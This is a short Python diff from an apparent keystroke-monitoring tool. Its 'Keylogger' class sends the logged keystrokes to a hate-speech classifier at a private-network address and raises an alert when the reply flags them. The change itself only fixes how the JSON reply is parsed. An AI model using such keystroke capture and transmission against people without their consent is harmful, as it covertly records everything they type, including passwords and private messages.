@@ -18,10 +18,12 @@ def isHateSpeech(self):
     header = {'Content-type': 'application/json'}
     hateSpeech = requests.post("http://192.168.18.114:5000/predict", data=dataLogs, headers=header)
 
-    if 'yes' in hateSpeech:
+    hateSpeechJson = json.loads(hateSpeech.content)
+    print(hateSpeechJson)
+    if hateSpeechJson[0]['valor'] == 1:
         return True
-    else:
-        return False
+
+    return False
 
 def getProcess(self):
     infoSet = set()
@@ -89,8 +91,7 @@ class Keylogger:
         self.log += name
 
     def report(self):
-        if self.log:
-            isHateSpeech(self)
+        if self.log and isHateSpeech(self):
             sendAlert(self)
 
         self.log = ""
